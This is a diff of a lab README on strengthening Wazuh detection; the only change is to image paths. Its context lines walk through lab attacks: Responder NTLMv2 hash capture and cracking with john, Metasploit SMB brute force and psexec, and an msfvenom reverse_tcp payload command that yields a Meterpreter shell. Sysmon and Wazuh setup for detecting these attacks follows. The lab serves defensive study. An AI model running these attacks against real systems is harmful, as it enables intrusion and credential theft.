@@ -76,19 +76,19 @@ sudo apt install responder -y
 
 2. Wait for the victim Windows machine to query a non-existent hostname.
 
-  ![Alt text](images/2.png)
+  ![Alt text](Enhancement_detection_capabilities_Wazuh/images/2.png)
 
 3. Responder captures the NTLMv2 hash.
    
-![Alt text](images/3.png)
+![Alt text](Enhancement_detection_capabilities_Wazuh/images/3.png)
 
 4. Find the hash in Responder logs.
    
-  ![Alt text](images/4.png)
+  ![Alt text](Enhancement_detection_capabilities_Wazuh/images/4.png)
   
 5. Crack it using `john`.
     
-     ![Alt text](images/5.png)
+     ![Alt text](Enhancement_detection_capabilities_Wazuh/images/5.png)
     
 
 ---
@@ -104,27 +104,27 @@ msfconsole
 ```
 2. Use module: `auxiliary/scanner/smb/smb_login`
    
-      ![Alt text](images/6.png)
+      ![Alt text](Enhancement_detection_capabilities_Wazuh/images/6.png)
 
 3. Check the options
 
-    ![Alt text](images/7.png)
+    ![Alt text](Enhancement_detection_capabilities_Wazuh/images/7.png)
    
 4. Set required options (RHOSTS, PASS_FILE, etc.)
 
-    ![Alt text](images/8.png)
+    ![Alt text](Enhancement_detection_capabilities_Wazuh/images/8.png)
    
 5. Run and retrieve valid credentials (e.g., `Administrator:password2`)
 
-    ![Alt text](images/9.png)
+    ![Alt text](Enhancement_detection_capabilities_Wazuh/images/9.png)
    
 6. Use exploit: `exploit/windows/smb/psexec`
 
-    ![Alt text](images/10.png)
+    ![Alt text](Enhancement_detection_capabilities_Wazuh/images/10.png)
     
 7. Set required options (RHOSTS,LHSOT, etc.) and Run. Get a Meterpreter session.
 
-     ![Alt text](images/12.png)
+     ![Alt text](Enhancement_detection_capabilities_Wazuh/images/12.png)
 
 ---
 
@@ -139,21 +139,21 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe > 
 ```
 2. On snother terminal, Host `shell.exe` on a server.
    
- ![Alt text](images/14.png)
+ ![Alt text](Enhancement_detection_capabilities_Wazuh/images/14.png)
 
 2. Visit URL from Windows machine to download.
    
- ![Alt text](images/15.png)
+ ![Alt text](Enhancement_detection_capabilities_Wazuh/images/15.png)
 
 4. Start listener on Kali: `msfconsole` + `exploit/multi/handler`.
 
    
- ![Alt text](images/16.png)
+ ![Alt text](Enhancement_detection_capabilities_Wazuh/images/16.png)
 
 6. Execute on Windows → Meterpreter shell opens.
 
    
- ![Alt text](images/18.png)
+ ![Alt text](Enhancement_detection_capabilities_Wazuh/images/18.png)
 
 
 ---
@@ -166,7 +166,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe > 
 
   Configuration example:
 
-   ![Alt text](images/19.png)
+   ![Alt text](Enhancement_detection_capabilities_Wazuh/images/19.png)
 
 Note:
    - Use `onmatch="include"` for filetring
@@ -179,15 +179,15 @@ Sysmon64.exe -c
 ```
 3. You should be able to find Sysmon under windows:
    
-    ![Alt text](images/20.png)
+    ![Alt text](Enhancement_detection_capabilities_Wazuh/images/20.png)
 
 4. Run Notepad (as Administrator) and open `ossec.conf` in the directory below:
 
-    ![Alt text](images/21.png)
+    ![Alt text](Enhancement_detection_capabilities_Wazuh/images/21.png)
    
 6. Add the configuration below:
 
-    ![Alt text](images/22.png)
+    ![Alt text](Enhancement_detection_capabilities_Wazuh/images/22.png)
 
 
 ---
@@ -208,7 +208,7 @@ Create lists in:
 
 Then include them in `ossec.conf`.
 
-   ![Alt text](images/23.png)
+   ![Alt text](Enhancement_detection_capabilities_Wazuh/images/23.png)
    
 ---
 
